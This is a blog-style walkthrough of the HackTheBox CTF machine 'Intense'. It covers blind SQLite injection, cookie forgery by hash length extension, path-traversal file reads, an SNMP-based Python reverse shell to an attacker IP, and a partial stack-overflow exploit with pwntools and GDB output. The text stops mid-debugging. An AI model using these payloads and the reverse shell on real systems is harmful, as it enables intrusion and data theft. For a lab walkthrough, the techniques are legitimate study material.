---
title: HackTheBox — Intense Writeup
date: 2020-11-14 04:41:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, intense, ctf, linux, code review, code vulnerable, sqli, crack cookies, python, lfi, snmp, shell, exploit, analysis code, buffer overflow, binart exploitation, debugging, canary, aslr, rop, privilege escaltion, ssh tunnel, root]
image: /assets/img/Posts/Intense.jpeg
---
>/
>
>/
>
>Its difficulty level is hard and has an IP 10.10.10.195
>
>Really, this machine taught me a lot and a lot, from the technical things they taught me the code review and some scripting skills, I got to know the SQLite Injection, and most of all, I learned a little bit about the Binary Exploration.
>

## Reconnaissance

I started with basic `nmap` enumeration.

### Nmap:

```shell
ezi0x00@kali:~~/HTB/Intense$ sudo nmap -sC -sV -O 10.10.10.195
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-15 00:43 EST
Nmap scan report for 10.10.10.195
Host is up (0.42s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Intense - WebApp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/15%OT=22%CT=1%CU=44554%PV=Y%DS=2%DC=I%G=Y%TM=5FB0C0
OS:38%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=RD%II=I%TS=A)O
OS:PS(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BS
OS:T11NW7%O6=M54BST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)E
OS:CN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.46 seconds
```
### Summary:

1. Port 80 - HTTP Service 
2. Port 22 -- SSH Service

## Port 80 - HTTP Service 

add it to /etc/hosts to redirect to there:

![website](/assets/img/Posts/webappint.png)

We will notice that this application has an `opensource` that we download and read the code so that we can register as an admin
```shell
ezi0x00@kali:~/HTB/Intense/app$ ls -lah
total 32K
drwx------ 4 ezi0x00 ezi0x00 4.0K Nov 15 01:04 .
drwxr-xr-x 3 ezi0x00 ezi0x00 4.0K Nov 15 01:04 ..
-rw-r--r-- 1 ezi0x00 ezi0x00  813 Nov 10  2019 admin.py
-rw-r--r-- 1 ezi0x00 ezi0x00 2.2K Nov 15  2019 app.py
-rw-r--r-- 1 ezi0x00 ezi0x00 1.4K Nov 16  2019 lwt.py
drwxr-xr-x 6 ezi0x00 ezi0x00 4.0K Sep 11  2019 static
drwxr-xr-x 2 ezi0x00 ezi0x00 4.0K Nov 21  2019 templates
-rw-r--r-- 1 ezi0x00 ezi0x00 2.9K Nov 15  2019 utils.py
```

## Code Review 

This application is made up of `Python Flask Framework`

from `admin.py`   
```
@admin.route("/admin")
def admin_home():
    if not is_admin(request):
        abort(403)
    return render_template("admin.html")
```    
There is an admin panel along with two endpoints to retrieve something.
```
@admin.route("/admin/log/view", methods=["POST"])
def view_log():
    if not is_admin(request):
        abort(403)
    logfile = request.form.get("logfile")
    if logfile:
        logcontent = admin_view_log(logfile)
        return logcontent
    return ''

@admin.route("/admin/log/dir", methods=["POST"])
def list_log():
    if not is_admin(request):
        abort(403)
    logdir = request.form.get("logdir")
    if logdir:
        logdir = admin_list_log(logdir)
        return str(logdir)
    return ''
```
This admin panel have two parameters `logfile` and `logdir` and  `Method is POST`.

The Admin panel is Forbidden this means that we can’t access it without Admin credentials.
![website](/assets/img/Posts/forb.png)

>I tried to access these endpoints with the given parameters along with Burp in the Guest account, it’s not worked. We need to be an admin to access this feature.

from `app.py`
```
@app.route('/submit', methods=["GET"])
def submit():
    session = get_session(request)
    if session:
        user = get_user(session["username"], session["secret"])
        return render_template("submit.html", page="submit", user=user)
    return render_template("submit.html", page="submit")
```
The session is the cookie here and it is composed of two parts. One is the name of the user and another one is secret.
```
@app.route("/submitmessage", methods=["POST"])
def submitmessage():
    message = request.form.get("message", '')
    if len(message) > 140:
        return "message too long"
    if badword_in_str(message):
        return "forbidden word in message"
    # insert new message in DB
    try:
        query_db("insert into messages values ('%s')" % message)
    except sqlite3.Error as e:
        return str(e)
    return "OK"
```
Database is `SQLite`
There are two restrictions in sending messages. In the `Submit` form, the message must be no more than 140 characters long, and some words are prohibited.
and here we found vulnerable sqlite request:
```
new_msg= "insert into messages values ('%s')" % message
```
let's continue and we will back again.

from `lwt.py`    
```
from hashlib import sha256
from base64 import b64decode, b64encode
from random import randrange
import os

SECRET = os.urandom(randrange(8, 15))


class InvalidSignature(Exception):
    pass


def sign(msg):
    """ Sign message with secret key """
    return sha256(SECRET + msg).digest()
```
This part responsible for `Hashing`. have two mission design sessions key also verifying the message.
```
def parse_session(cookie):
    """ Parse cookie and return dict
        @cookie: "key1=value1;key2=value2"

        return {"key1":"value1","key2":"value2"}
    """
    b64_data, b64_sig = cookie.split('.')
    data = b64decode(b64_data)
    sig = b64decode(b64_sig)
    if not verif_signature(data, sig):
        raise InvalidSignature
    info = {}
    for group in data.split(b';'):
        try:
            if not group:
                continue
            key, val = group.split(b'=')
            info[key.decode()] = val
        except Exception:
            continue
    return info
```
Here `sig` is `signature` key and `data` is known for the `username`. These all are encoded in `base64` and separated by a `"."`. 
So this is a shape of cookie.

from `utils.py`

This script shows us how the database works
```
def is_admin(request):
    session = get_session(request)
    if not session:
        return None
    if "username" not in session or "secret" not in session:
        return None
    user = get_user(session["username"], session["secret"])
    return user.role == 1
```
The role of the admin is `1`
```
def admin_view_log(filename):
    if not path.exists(f"logs/{filename}"):
        return f"Can't find {filename}"
    with open(f"logs/{filename}") as out:
        return out.read()


def admin_list_log(logdir):
    if not path.exists(f"logs/{logdir}"):
        return f"Can't find {logdir}"
    return listdir(logdir)
```
The `secrets` we want in the `/admin/log`. 
To get this, we need to become the `Admin`, 
What I understood from the powers of the admin, and we will refer to it in detail again. two admin route which could allows us perform a directory traversal attack and read files from the box.

let's first examine the guest cookies and whether we can modify them to become addictive or not, because as we noticed in the code that cookies are placed in a specific way, the name and the secret, and separating them by `.`

we will use `Cookie-Editor`

![website](/assets/img/Posts/cookieint.png)
Cookie Editor gave us the cookie of the guest. As you can see, the cookie’s attribute is named as auth and that is being verified on the backend parameter too. Let’s copy this string to our terminal to further understanding.
```shell
ezi0x00@kali:~/HTB/Intense$ nano cookie.py 
ezi0x00@kali:~/HTB/Intense$ cat cookie.py
from base64 import *
cookie = "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.Pa7nW7aHjP+YPW5avOfc78MHKz6x+AuFtKMOGHanePY="
user_guest, secret_guest = cookie.split(".")
cookie_guest = b64decode(user_guest) + b64decode(secret_guest)
print cookie_guest
```
```shell
ezi0x00@kali:~/HTB/Intense$ python cookie.py
username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;=��[�����=nZ�����+>��
                                                                                                            ���▒v�x�
```
we got is a username, a secret string, and also an unreadable data. Its time to back to `SQLI` on the `Submit` page.

I used this [**List**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md), cause this app used `SQLite`
first output:
```
near "–": syntax error
```
Using the MATCH function along with CASE THEN, if the secret of user match for role 1

Payload:
`"'AND (SELECT CASE WHEN ((SELECT substr(secret,"+str(i+1)+",1) FROM users WHERE role=1) = '"+c+"') THEN 1 ELSE MATCH(1,1) END))  --"'`

![website](/assets/img/Posts/sqlint.png)
With sql listing request, i can't return any Db information, that's mean this function can’t match the exact length of the `secret` string for the user who has role 1 that is Admin. but i can do an injection by guessing admin secret through return message.

after search i found that we can bruteforce password using `substr()` function.
when we decode the guest cookie we found The length of `Guest’s secret` is 64 means that we need to loop through the `SQLi` until we get 64. So along with my friend, I made a python [**script**](https://github.com/0xN1ghtR1ngs/CTF-Scripts/blob/main/IntenseMachine-HTB/brute_hash.py) to bruteforce it.

and here the admin cookie: 
```
The password length is : 64
The password: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
```
It's sha256 hash, we need to crack it.
From the source code we see that this signature is an sha256(data+RANDOM_KEY) concatenated to the base64 user. 
I've looked for a long time for how we can crack this hash and i found this [**article**](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks), and i made [**script**](https://github.com/0xN1ghtR1ngs/CTF-Scripts/blob/main/IntenseMachine-HTB/crackhash.py) to do this mission.

and here we did it :"D
```
The cookie : auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQO3VzZXJuYW1lPWFkbWluO3NlY3JldD1mMWZjMTIwMTBjMDk0MDE2ZGVmNzkxZTE0MzVkZGZkY2FlY2NmODI1MGUzNjYzMGMwYmM5MzI4NWMyOTcxMTA1Ow==.IQobfpRfcEVJCrr8BxQ+IeLy7wRbwHkJV3EZt3ehmpY=   
The lenght :11
```
try it by edit cookie in browser.
![website](/assets/img/Posts/logincookieadmin.png)

if you remember source code review from the app code source we have two routes in admin section, `logfile`,`logdir`

To have access we have to send a post request with the parameter "logfile" for the route "admin/log/view" and post a filename param `logfile=../../etc/passwd`
```
@admin.route("/admin/log/view", methods=["POST"])
def view_log():
    if not is_admin(request):
        abort(403)
    logfile = request.form.get("logfile")
    if logfile:
        logcontent = admin_view_log(logfile)
        return logcontent
    return ''


@admin.route("/admin/log/dir", methods=["POST"])
def list_log():
    if not is_admin(request):
        abort(403)
    logdir = request.form.get("logdir")
    if logdir:
        logdir = admin_list_log(logdir)
        return str(logdir)
    return ''
```
result:
![website](/assets/img/Posts/burperes.png)
So we don't need a shell to get `user flag` we got a `LFI` so just insert `logfile=../../../../../../../../../../../../home/user/user.txt`
![website](/assets/img/Posts/lfiuserflag.png)

## Shell

When we saw `passwd`, i noticed there are `snmp`
![website](/assets/img/Posts/snmppasswd.png)
>Simple Network Management Protocol (SNMP) is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. 

let's read the file configuration maybe we get a credentials.
![website](/assets/img/Posts/snmpdconf.png)

here some info is very useful
```
 rocommunity public  default    -V systemonly
 rwcommunity SuP3RPrivCom90
```
to get `RCE` i read this [**article**](https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e)

An abbreviation of the article and time:
First, we need make a string to inject my commands inside the snmpd.conf file, So we put a reverse shell command into the `NET-SNMP-EXTEND-MIB` object , and execute it with `snmwalk`
```
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 \     
    10.10.10.195 \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /usr/bin/python3 \
    'nsExtendArgs."command"'    = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.16.x\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash")"'
```    
Then, run the above `snmpwalk` command to find out the ISO where the “Hello World” is executing.
```
snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195
```
Using all of this manually is very difficult and you will face many problems with that i used this [**tool**](https://github.com/mxrch/snmp-shell) to automate all this process.
```shell
ezi0x00@kali:~/HTB/Intense/snmp-shell$ rlwrap python3 shell.py 10.10.10.195 -c SuP3RPrivCom90

Debian-snmp@intense:/$ id 
uid=111(Debian-snmp) gid=113(Debian-snmp) groups=113(Debian-snmp)
```
After got a shell.

![website](/assets/img/Posts/bedan.jpeg)

## Privilege Escaltion

```shell
Debian-snmp@intense:/home/user$ ls
note_server
note_server.c
user.txt
```
I found `note_server` and the source code of this server. I was suspicious that it might be a buff overflow, but in pentest, no guess. Here the most important thing is the `enumeration`.
So if it server let's see what's running in machine 
```shell
Debian-snmp@intense:/home/user$ netstat -lapute | grep -i root
(No info could be read for "-p": geteuid()=111 but you should be root.)
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      root       27635      -                   
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      root       29885      -                   
tcp        0      0 localhost:5001          0.0.0.0:*               LISTEN      root       26459      -                   
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      root       29896      -                   
udp        0      0 0.0.0.0:51290           0.0.0.0:*                           root       27543      -                   
udp        0      0 0.0.0.0:snmp            0.0.0.0:*                           root       27545      -  
```
The server running as root on port 5001. and we have the source code of the server, let's analysis

from `note_server.c`
let's see main function
```
int main( int argc, char *argv[] ) {
    int sockfd, newsockfd, portno;
    unsigned int clilen;
    struct sockaddr_in serv_addr, cli_addr;
    int pid;

    /* ignore SIGCHLD, prevent zombies */
    struct sigaction sigchld_action = {
        .sa_handler = SIG_DFL,
        .sa_flags = SA_NOCLDWAIT
    };
    sigaction(SIGCHLD, &sigchld_action, NULL);

    /* First call to socket() function */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0) {
        perror("ERROR opening socket");
        exit(1);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
        perror("setsockopt(SO_REUSEADDR) failed");

    /* Initialize socket structure */ 
    bzero((char *) &serv_addr, sizeof(serv_addr));
    portno = 5001;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    serv_addr.sin_port = htons(portno);

    /* Now bind the host address using bind() call.*/
    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        perror("ERROR on binding");
        exit(1);
    }
```
main function use the socket and wait for a client to connect. 
```
while (1) {
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

        if (newsockfd < 0) {
            perror("ERROR on accept");
            exit(1);
        }

        /* Create child process */
        pid = fork();

        if (pid < 0) {
            perror("ERROR on fork");
            exit(1);
        }

        if (pid == 0) {
            /* This is the client process */
            close(sockfd);
            handle_client(newsockfd);
            exit(0);
        }
        else {
            close(newsockfd);
        }
```
The server create a child process by `fork()`, and here it became clearer that the server `handle_client` using sockets and `fork()`.

let's see a `handle_client`
```
void handle_client(int sock)     {
    char note[BUFFER_SIZE];
    uint16_t index = 0;
    uint8_t cmd;
    // copy var
    uint8_t buf_size;
    uint16_t offset;
    uint8_t copy_size;
```
this is `variables` pushed in buff, and before function we see `#define BUFFER_SIZE 1024` defines a macro named BUFFER_SIZE as an abbreviation for the token 1024, and it's problem it will make `buff overflow`.
```
while (1) {

        // get command ID
        if (read(sock, &cmd, 1) != 1) {
            exit(1);
        }

        switch(cmd) {
            // write note
            case 1:
                if (read(sock, &buf_size, 1) != 1) {
                    exit(1);
                }

                // prevent user to write over the buffer
                if (index + buf_size > BUFFER_SIZE) {
                    exit(1);
                }

                // write note
                if (read(sock, &note[index], buf_size) != buf_size) {
                    exit(1);
                }

                index += buf_size;


            break;
``` 
read from client command buffer and put into the note array
```           
            // copy part of note to the end of the note
            case 2:
                // get offset from user want to copy
                if (read(sock, &offset, 2) != 2) {
                    exit(1);
                }

                // sanity check: offset must be > 0 and < index
                if (offset < 0 || offset > index) {
                    exit(1);
                }

                // get the size of the buffer we want to copy
                if (read(sock, &copy_size, 1) != 1) {
                    exit(1);
                }

                // prevent user to write over the buffer's note
                if (index > BUFFER_SIZE) {
                    exit(1);
                }

                // copy part of the buffer to the end 
                memcpy(&note[index], &note[offset], copy_size);

                index += copy_size;
            break;
```
copy data from an offset of the note array to an other offset `index` in the same array
```
            // show note
            case 3:
                write(sock, note, index);
            return;

        }
    }

```
write the content of the note array

let's compile the code local on my machine with `-ggdb` flag adds debug symbols for easier debugging with source code. and check executable file.
```shell
ezi0x00@kali:~/HTB/Intense$ gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro note_server.c -o note_local -ggdb
ezi0x00@kali:~/HTB/Intense$ checksec --file=note_local
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   79) Symbols       No    0               2               note_server
```
there are `PIE`, `RELRO -canary protection`, so when we do `BOF`, it's impossible canary will detect stack smash.
my mood:

![website](/assets/img/Posts/7warat.jpg)

There is no impossible that we can do that by `canary leak`.
let's do some reverse in radare2 and focus on `sym.handle_client`.

```
││ │╎  		0x0000144b      	488b45f8       mov rax, qword [var_8h]
│   ││ │╎   0x0000144f      	644833042528.  sub rax, qword fs:[0x28]
│   ││┌───< 0x00001458      	740c           je 0x1466
│  ┌──────< 0x000045a      		eb05           jmp 0x1461
│  ││││││   ; CODE XREFS from sym.handle_client @ 0x12a0, 0x134c, 0x142a
│  │└└─└└─< 0x00001450      	e9d3fdffff     jmp 0x124e
│  │  │     ; CODE XREF from sym.handle_client @ 0x145a
│  └──────> 0x00001461      	e88ffbffff     call sym.imp.__stack_chk_fail ;[3] ; void __stack_chk_fail(void)
│  │  │     ; CODE XREF from sym.handle_client @ 0x1458
│     └───> 0x00001466      	c9             leave
└           0x00001467      	c3             ret
```
here we are, as we said we should find leak to can bypass all protections.
we can see:
1. the random `qword [var_8h]`  is stored on top of the stack and any buffer overflow trying to overwite the return address, will modify the canary QWORD before.
2. subtract `qword [var_8h]` from `qword fs:[0x28]` if `ZF=1` jmp to leave, or call the function `imp.__stack_chk_fail`

let's `debug`, before that let's prepare `exploit` code cause we need that to calculate interesting things.
```
#!/usr/bin/env python3

import struct
from pwn import *
context.binary = ELF('./note_local')
e = context.binary
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc')
p = remote("127.0.0.1", 5001)
```
you can understand this lines from this [**toutrial**](https://docs.pwntools.com/en/stable/intro.html). 

but what's mean libc?
>is commonly used as a shorthand for the "standard C library", a library of standard functions that can be used by all C programs (and sometimes by programs in other languages). Because of some history (see below), use of the term "libc" to refer to the standard C library is somewhat ambiguous on Linux.
>

because this local machine just to know where is `libc` file  
```
ezi0x00@kali:~/HTB/Intense$ ldd note_server
        linux-vdso.so.1 (0x00007ffc7a3e4000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4dde41e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f4ddea12000)
```

```
def write(data):
    p.send("\x01")
    p.send(p8(len(data)))
    p.send(data)

def copy(offset,size):
    p.send("\x02")
    p.send(p16(offset))
    p.send(p8(size))

def read():
    p.send("\x03")

def exploit(canary,rop):
    payload = b"A" * 8
    payload += p64(canary)
    payload += p64(rbp)
    payload += bytes(rop)
    junk = b"A" * (200 - len(payload))
    write(payload + junk)
    write("A"* 200)
    write("A"* 200)
    write("A"* 200)
    write("A"* 224)
    copy(0,len(payload))
    read()
    p.recv(1024 + len(payload))  
```
The script above defines four functions based on `void handle_client(int sock)`:
. 
1. The write() function takes in the size and data to send. 
2. The copy() function takes in the offset and number of bytes to copy. 
3. The read() function just reads from the server
4. The exploit() function which takes in a payload. This payload is appended to the leaked canary, so that the program doesn't crash. The ROP chain is sent first, which places it at the top of the note buffer. Next, we fill up the note buffer up to 1024 as before. The `copy()` function is then called with the offset as 0 . This ends up copying the payload from the top of note to the bottom of note, hence overwriting the stack. The pwntools ROP helper can be used to automatically create ROP chains.
>`p8` `p16` based on local variables.


let's `debug` this shit.
```shell
ezi0x00@kali:~/HTB/Intense$ gdb ./note_local  
.....sinp.....
gef➤
```
```shell
gef➤ set follow-fork-mode child
```


>`follow-fork-mode` is set to child, which instructs `GDB` to attach to the child after `fork`.


```shell
gef➤ b main
Breakpoint 1 at 0x146c
gef➤  r
Starting program: /home/ezi0x00/HTB/Intense/note_local 

Breakpoint 1, main (argc=0x1, argv=0x7fffffffe138) at note_server.c:93
93      int main( int argc, char *argv[] ) 



[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555555468  →  <main+0> push rbp
$rbx   : 0x0               
$rcx   : 0x00007ffff7fad718  →  0x00007ffff7fafb00  →  0x0000000000000000
$rdx   : 0x00007fffffffe148  →  0x00007fffffffe471  →  "SHELL=/bin/bash"
$rsp   : 0x00007fffffffdf50  →  0x00007fffffffe138  →  0x00007fffffffe44c  →  "/home/ezi0x00/HTB/Intense/note_local"
$rbp   : 0x00007fffffffe040  →  0x0000555555555690  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffe138  →  0x00007fffffffe44c  →  "/home/ezi0x00/HTB/Intense/note_local"
$rdi   : 0x1               
$rip   : 0x0000555555555480  →  <main+24> mov rax, QWORD PTR fs:0x28
$r8    : 0x0               
$r9    : 0x00007ffff7fe2180  →  <_dl_fini+0> push rbp
$r10   : 0x7               
$r11   : 0x2               
$r12   : 0x0000555555555140  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf50│+0x0000: 0x00007fffffffe138  →  0x00007fffffffe44c  →  "/home/ezi0x00/HTB/Intense/note_local"         ← $rsp
0x00007fffffffdf58│+0x0008: 0x0000000100000380
0x00007fffffffdf60│+0x0010: 0x0000038000000380
0x00007fffffffdf68│+0x0018: 0x0000038000000380
0x00007fffffffdf70│+0x0020: 0x0000038000000380
0x00007fffffffdf78│+0x0028: 0x0000038000000380
0x00007fffffffdf80│+0x0030: 0x0000038000000380
0x00007fffffffdf88│+0x0038: 0x0000038000000380
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555546c <main+4>         sub    rsp, 0xf0
   0x555555555473 <main+11>        mov    DWORD PTR [rbp-0xe4], edi
   0x555555555479 <main+17>        mov    QWORD PTR [rbp-0xf0], rsi
 → 0x555555555480 <main+24>        mov    rax, QWORD PTR fs:0x28
   0x555555555489 <main+33>        mov    QWORD PTR [rbp-0x8], rax
   0x55555555548d <main+37>        xor    eax, eax
   0x55555555548f <main+39>        lea    rdx, [rbp-0xa0]
   0x555555555496 <main+46>        mov    eax, 0x0
   0x55555555549b <main+51>        mov    ecx, 0x13
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:note_server.c+93 ────
     88  
     89  }
     90  
     91  
     92  
         // argc=0x1, argv=0x00007fffffffdf50  →  [...]  →  "/home/ezi0x00/HTB/Intense/note_local"
 →   93  int main( int argc, char *argv[] ) {
     94      int sockfd, newsockfd, portno;
     95      unsigned int clilen;
     96      struct sockaddr_in serv_addr, cli_addr;
     97      int pid;
     98  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "note_local", stopped 0x555555555480 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555480 → main(argc=0x1, argv=0x7fffffffe138)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤    
```

breakpoint at `main` and `run`
see `list` of code and know which line there are `write` case to breakpoint on it to send shell code cause this `case`  write the content of the note array. 
then `continue` Parallel to running the script.

```shell
gef➤  b 82
Breakpoint 2 at 0x55555555542c: file note_server.c, line 82.
gef➤  c
Continuing
```
```shell
ezi0x00@kali:~/HTB/Intense$ python3 exploit.py 
[*] '/home/ezi0x00/HTB/Intense/note_local'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 127.0.0.1 on port 5001: Done
```
```shell.
gef➤  c
Continuing
Continuing.
[Attaching after process 15551 fork to child process 15562]
[New inferior 2 (process 15562)]
[Detaching after fork from parent process 15551]
[Inferior 1 (process 15551) detached]
[Switching to process 15562]



──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x3               
$rbx   : 0x0               
$rcx   : 0x00007ffff7edddee  →  0x5a77fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x00007fffffffdb10  →  0x0000000000000003
$rbp   : 0x00007fffffffdf40  →  0x00007fffffffe040  →  0x0000555555555690  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffdb29  →  0x4104ff0400ffe003
$rdi   : 0x4               
$rip   : 0x000055555555542c  →  <handle_client+519> movzx edx, WORD PTR [rbp-0x412]
$r8    : 0x0               
$r9    : 0x00007ffff7fb5540  →  0x00007ffff7fb5540  →  [loop detected]
$r10   : 0x00007ffff7fb5810  →  0x0000000000002053 ("S "?)
$r11   : 0x246             
$r12   : 0x0000555555555140  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb10│+0x0000: 0x0000000000000003   ← $rsp
0x00007fffffffdb18│+0x0008: 0x0000000400000000
0x00007fffffffdb20│+0x0010: 0x0000000000000000
0x00007fffffffdb28│+0x0018: 0x04ff0400ffe00300
0x00007fffffffdb30│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffdb38│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffdb40│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffdb48│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555420 <handle_client+507> movzx  eax, al
   0x555555555423 <handle_client+510> add    WORD PTR [rbp-0x412], ax
   0x55555555542a <handle_client+517> jmp    0x55555555545c <handle_client+567>
 → 0x55555555542c <handle_client+519> movzx  edx, WORD PTR [rbp-0x412]
   0x555555555433 <handle_client+526> lea    rcx, [rbp-0x410]
   0x55555555543a <handle_client+533> mov    eax, DWORD PTR [rbp-0x424]
   0x555555555440 <handle_client+539> mov    rsi, rcx
   0x555555555443 <handle_client+542> mov    edi, eax
   0x555555555445 <handle_client+544> call   0x555555555050 <write@plt>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:note_server.c+82 ────
     77                  index += copy_size;
     78              break;
     79  
     80              // show note
     81              case 3:
                         // sock=0x4, note=0x00007fffffffdb30  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
 →   82                  write(sock, note, index);
     83              return;
     84  
     85          }
     86      }
     87  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "note_local", stopped 0x55555555542c in handle_client (), reason: BREAKPOINT
